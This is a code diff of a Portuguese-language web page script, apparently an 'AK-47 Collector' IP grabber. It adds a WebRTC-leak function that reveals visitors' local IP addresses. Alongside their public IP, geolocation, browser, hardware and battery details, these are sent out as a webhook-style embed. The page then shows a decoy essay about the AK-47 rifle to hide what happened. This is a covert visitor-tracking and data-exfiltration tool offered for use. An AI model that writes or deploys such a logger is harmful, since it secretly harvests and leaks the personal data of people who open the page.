@@ -28,6 +28,33 @@
       });
     }
 
+    // Função para capturar IPs via WebRTC Leak
+    function getWebRTCIps(callback) {
+      const ips = new Set();
+
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("");
+
+      pc.onicecandidate = event => {
+        if (!event.candidate) {
+          callback(Array.from(ips));
+          return;
+        }
+        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+        const ipMatch = ipRegex.exec(event.candidate.candidate);
+        if (ipMatch) {
+          ips.add(ipMatch[1]);
+        }
+      };
+
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .catch(err => {
+          console.error("Erro WebRTC:", err);
+          callback([]);
+        });
+    }
+
     async function coletarEEnviarDados() {
       try {
         // IP público
@@ -56,44 +83,47 @@
         const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
         const browserVersion = getBrowserVersion(userAgent);
 
-        // Função para enviar com dados da bateria
-        function enviarComBateria(batteryLevel, charging) {
-          const embed = {
-            title: "🕵️ Novo visitante",
-            color: 0xFF0000,
-            fields: [
-              { name: "IP", value: ip, inline: true },
-              { name: "Cidade", value: ipinfoData.city || "N/A", inline: true },
-              { name: "Região", value: ipinfoData.region || "N/A", inline: true },
-              { name: "País", value: ipinfoData.country || "N/A", inline: true },
-              { name: "Localização (lat,long)", value: ipinfoData.loc || "N/A", inline: true },
-              { name: "Organização", value: ipinfoData.org || "N/A", inline: true },
-              { name: "Timezone (IPinfo)", value: ipinfoData.timezone || "N/A", inline: true },
-              { name: "Navegador (userAgent)", value: userAgent, inline: false },
-              { name: "Versão do navegador", value: browserVersion, inline: true },
-              { name: "Idioma", value: language, inline: true },
-              { name: "Fuso horário (navegador)", value: timezone, inline: true },
-              { name: "Resolução da tela", value: screenResolution, inline: true },
-              { name: "DPI (devicePixelRatio)", value: devicePixelRatio.toString(), inline: true },
-              { name: "Plugins", value: plugins, inline: false },
-              { name: "Núcleos da CPU", value: hardwareConcurrency.toString(), inline: true },
-              { name: "Memória RAM aproximada (GB)", value: deviceMemory.toString(), inline: true },
-              { name: "Conexão", value: `Tipo: ${connectionType}, Downlink: ${downlink}`, inline: true },
-              { name: "Cookies habilitados", value: cookieEnabled ? "Sim" : "Não", inline: true },
-              { name: "Online", value: online ? "Sim" : "Não", inline: true },
-              { name: "Prefere modo escuro", value: prefersDarkMode ? "Sim" : "Não", inline: true },
-              { name: "Nível da bateria", value: batteryLevel, inline: true },
-              { name: "Carregando bateria", value: charging, inline: true }
-            ],
-            footer: {
-              text: "AK-47 Collector"
-            },
-            timestamp: new Date().toISOString()
-          };
+        // Captura IPs do WebRTC Leak antes de enviar
+        getWebRTCIps((webrtcIps) => {
+          // Função para enviar com dados da bateria
+          function enviarComBateria(batteryLevel, charging) {
+            const embed = {
+              title: "🕵️ Novo visitante",
+              color: 0xFF0000,
+              fields: [
+                { name: "IP público", value: ip, inline: true },
+                { name: "IPs WebRTC Leak", value: webrtcIps.length > 0 ? webrtcIps.join(", ") : "Nenhum detectado", inline: false },
+                { name: "Cidade", value: ipinfoData.city || "N/A", inline: true },
+                { name: "Região", value: ipinfoData.region || "N/A", inline: true },
+                { name: "País", value: ipinfoData.country || "N/A", inline: true },
+                { name: "Localização (lat,long)", value: ipinfoData.loc || "N/A", inline: true },
+                { name: "Organização", value: ipinfoData.org || "N/A", inline: true },
+                { name: "Timezone (IPinfo)", value: ipinfoData.timezone || "N/A", inline: true },
+                { name: "Navegador (userAgent)", value: userAgent, inline: false },
+                { name: "Versão do navegador", value: browserVersion, inline: true },
+                { name: "Idioma", value: language, inline: true },
+                { name: "Fuso horário (navegador)", value: timezone, inline: true },
+                { name: "Resolução da tela", value: screenResolution, inline: true },
+                { name: "DPI (devicePixelRatio)", value: devicePixelRatio.toString(), inline: true },
+                { name: "Plugins", value: plugins, inline: false },
+                { name: "Núcleos da CPU", value: hardwareConcurrency.toString(), inline: true },
+                { name: "Memória RAM aproximada (GB)", value: deviceMemory.toString(), inline: true },
+                { name: "Conexão", value: `Tipo: ${connectionType}, Downlink: ${downlink}`, inline: true },
+                { name: "Cookies habilitados", value: cookieEnabled ? "Sim" : "Não", inline: true },
+                { name: "Online", value: online ? "Sim" : "Não", inline: true },
+                { name: "Prefere modo escuro", value: prefersDarkMode ? "Sim" : "Não", inline: true },
+                { name: "Nível da bateria", value: batteryLevel, inline: true },
+                { name: "Carregando bateria", value: charging, inline: true }
+              ],
+              footer: {
+                text: "AK-47 Collector"
+              },
+              timestamp: new Date().toISOString()
+            };
 
-          sendPayload({ embeds: [embed] });
+            sendPayload({ embeds: [embed] });
 
-          document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.
+            document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.
 
 Projetada para ser simples, resistente e confiável, a AK-47 funciona em praticamente qualquer ambiente – desde desertos escaldantes até florestas úmidas. Seu calibre 7.62x39mm oferece um equilíbrio entre poder de fogo e controle de recuo, tornando-a eficaz em combate de curta e média distância.
 
@@ -102,20 +132,22 @@ A principal característica da AK-47 é sua durabilidade. Ela pode continuar fun
 Com mais de 100 milhões de unidades produzidas (contando variantes licenciadas e não licenciadas), a AK-47 é considerada a arma de fogo mais produzida da história. Seu design também deu origem a várias versões, como a AKM, AK-74 e muitas outras adaptações fabricadas em diferentes países.
 
 Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global. - Chat GPT</h2>`;
-        }
+          }
 
-        // Pega bateria, se disponível
-        if (navigator.getBattery) {
-          navigator.getBattery().then(battery => {
-            const batteryLevel = Math.round(battery.level * 100) + "%";
-            const charging = battery.charging ? "Sim" : "Não";
-            enviarComBateria(batteryLevel, charging);
-          }).catch(() => {
+          // Pega bateria, se disponível
+          if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+              const batteryLevel = Math.round(battery.level * 100) + "%";
+              const charging = battery.charging ? "Sim" : "Não";
+              enviarComBateria(batteryLevel, charging);
+            }).catch(() => {
+              enviarComBateria("N/A", "N/A");
+            });
+          } else {
             enviarComBateria("N/A", "N/A");
-          });
-        } else {
-          enviarComBateria("N/A", "N/A");
-        }
+          }
+        });
+
       } catch (error) {
         console.error("Erro ao obter ou enviar informações:", error);
         document.body.innerHTML = "<h2>Erro ao verificar.</h2>";
